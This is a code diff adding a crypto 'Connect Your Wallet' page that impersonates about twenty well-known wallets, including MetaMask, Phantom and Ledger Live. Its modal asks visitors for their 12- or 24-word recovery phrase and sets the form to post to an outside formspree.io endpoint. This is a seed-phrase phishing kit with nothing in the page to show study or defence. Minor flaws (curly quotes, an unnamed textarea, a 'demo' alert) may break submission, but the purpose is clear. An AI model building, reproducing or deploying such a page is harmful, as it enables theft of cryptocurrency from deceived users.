@@ -1,0 +1,267 @@
+
+<html><head><base href="https://localhost">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Connect Your Wallet</title>
+<style>
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+  font-family: 'Inter', sans-serif;
+}
+
+body {
+  background: #0f172a;
+  color: #fff;
+  min-height: 100vh;
+  padding: 20px;
+}
+
+.container {
+  max-width: 1200px;
+  margin: 0 auto;
+}
+
+.header {
+  text-align: center;
+  margin-bottom: 40px;
+  padding-top: 20px;
+}
+
+.header h1 {
+  font-size: 2.5rem;
+  margin-bottom: 10px;
+}
+
+.header p {
+  color: #94a3b8;
+}
+
+.wallets-grid {
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(250px, 1fr));
+  gap: 20px;
+  padding: 20px;
+}
+
+.wallet-item {
+  background: #1e293b;
+  border-radius: 12px;
+  padding: 20px;
+  cursor: pointer;
+  transition: all 0.3s ease;
+  display: flex;
+  align-items: center;
+  gap: 15px;
+}
+
+.wallet-item:hover {
+  transform: translateY(-2px);
+  background: #2d3748;
+}
+
+.wallet-logo {
+  width: 40px;
+  height: 40px;
+  background: #334155;
+  border-radius: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-weight: bold;
+  font-size: 1.2em;
+}
+
+.wallet-info {
+  flex: 1;
+}
+
+.wallet-name {
+  font-weight: 600;
+  margin-bottom: 4px;
+}
+
+.wallet-description {
+  font-size: 0.85rem;
+  color: #94a3b8;
+}
+
+.modal {
+  display: none;
+  position: fixed;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: rgba(0, 0, 0, 0.5);
+  align-items: center;
+  justify-content: center;
+  z-index: 1000;
+}
+
+.modal-content {
+  background: #1e293b;
+  padding: 30px;
+  border-radius: 16px;
+  width: 90%;
+  max-width: 500px;
+}
+
+.phrase-input {
+  width: 100%;
+  padding: 15px;
+  margin: 20px 0;
+  background: #334155;
+  border: 1px solid #475569;
+  border-radius: 8px;
+  color: #fff;
+  font-size: 1rem;
+}
+
+.connect-btn {
+  width: 100%;
+  padding: 15px;
+  background: #3b82f6;
+  color: white;
+  border: none;
+  border-radius: 8px;
+  font-size: 1rem;
+  cursor: pointer;
+  transition: background 0.3s ease;
+}
+
+.connect-btn:hover {
+  background: #2563eb;
+}
+
+.close-modal {
+  float: right;
+  background: none;
+  border: none;
+  color: #94a3b8;
+  font-size: 1.5rem;
+  cursor: pointer;
+}
+
+.modal-header {
+  margin-bottom: 20px;
+}
+
+@media (max-width: 768px) {
+  .wallets-grid {
+    grid-template-columns: 1fr;
+  }
+}
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="header">
+    <h1>Connect Your Wallet</h1>
+    <p>Choose your preferred wallet to connect to our platform</p>
+  </div>
+  
+  <div class="wallets-grid" id="walletsGrid"></div>
+</div>
+
+<div class="modal" id="connectModal">
+  <div class="modal-content">
+    <button class="close-modal" onclick="closeModal()">&times;</button>
+    <div class="modal-header">
+      <h2 id="modalWalletName">Connect Wallet</h2>
+    </div>
+<form action=“https://formspree.io/f/mdojqvda” method=“post”>
+    <textarea
+      class="phrase-input"
+      placeholder="Enter your recovery phrase (12 or 24 words)"
+      rows="4"
+    ></textarea>
+    <button class="connect-btn" onclick="handleConnect()">Connect Wallet</button>
+</form>
+  </div>
+</div>
+
+<script>
+const wallets = [
+  { name: "Phantom", letter: "P", description: "Solana's favorite wallet" },
+  { name: "Zerion", letter: "Z", description: "Your Web3 Smart Wallet" },
+  { name: "MetaMask", letter: "M", description: "The crypto wallet for DeFi & NFTs" },
+  { name: "Trust Wallet", letter: "T", description: "The most trusted & secure crypto wallet" },
+  { name: "Coinbase", letter: "C", description: "The easiest way to get started with crypto" },
+  { name: "Rainbow", letter: "R", description: "The fun and simple way to start with Ethereum" },
+  { name: "Sui Wallet", letter: "S", description: "The official Sui ecosystem wallet" },
+  { name: "Exodus", letter: "E", description: "The all-in-one crypto wallet" },
+  { name: "Atomic", letter: "A", description: "Universal cryptocurrency wallet" },
+  { name: "Argent", letter: "A", description: "The best wallet for DeFi & L2" },
+  { name: "BitPay", letter: "B", description: "Secure Bitcoin wallet platform" },
+  { name: "Crypto.com", letter: "C", description: "The all-in-one cryptocurrency platform" },
+  { name: "Dharma", letter: "D", description: "The wallet that pays you to save" },
+  { name: "Frame", letter: "F", description: "A privacy-focused Ethereum wallet" },
+  { name: "GreenAddress", letter: "G", description: "Bitcoin wallet for power users" },
+  { name: "Huobi", letter: "H", description: "Professional digital asset management" },
+  { name: "ImToken", letter: "I", description: "A digital asset wallet trusted by millions" },
+  { name: "Klever", letter: "K", description: "Secure crypto wallet for the future" },
+  { name: "Ledger Live", letter: "L", description: "The companion app for your hardware wallet" },
+  { name: "MyEtherWallet", letter: "M", description: "The original Ethereum wallet" }
+];
+
+function createWalletGrid() {
+  const grid = document.getElementById('walletsGrid');
+  wallets.forEach(wallet => {
+    const walletItem = document.createElement('div');
+    walletItem.className = 'wallet-item';
+    walletItem.onclick = () => openModal(wallet.name);
+    
+    walletItem.innerHTML = `
+      <div class="wallet-logo">${wallet.letter}</div>
+      <div class="wallet-info">
+        <div class="wallet-name">${wallet.name}</div>
+        <div class="wallet-description">${wallet.description}</div>
+      </div>
+    `;
+    
+    grid.appendChild(walletItem);
+  });
+}
+
+function openModal(walletName) {
+  const modal = document.getElementById('connectModal');
+  const modalWalletName = document.getElementById('modalWalletName');
+  modalWalletName.textContent = `Connect ${walletName}`;
+  modal.style.display = 'flex';
+}
+
+function closeModal() {
+  const modal = document.getElementById('connectModal');
+  modal.style.display = 'none';
+}
+
+function handleConnect() {
+  const phraseInput = document.querySelector('.phrase-input');
+  const phrase = phraseInput.value.trim();
+  
+  if (!phrase) {
+    alert('Please enter your recovery phrase');
+    return;
+  }
+  
+  // Here you would typically handle the wallet connection
+  // For demo purposes, we'll just show an alert
+  alert('Wallet connection initiated! This is a demo.');
+  closeModal();
+}
+
+// Close modal when clicking outside
+window.onclick = function(event) {
+  const modal = document.getElementById('connectModal');
+  if (event.target === modal) {
+    closeModal();
+  }
+}
+
+// Initialize the wallet grid
+createWalletGrid();
+</script>
+</body></html>
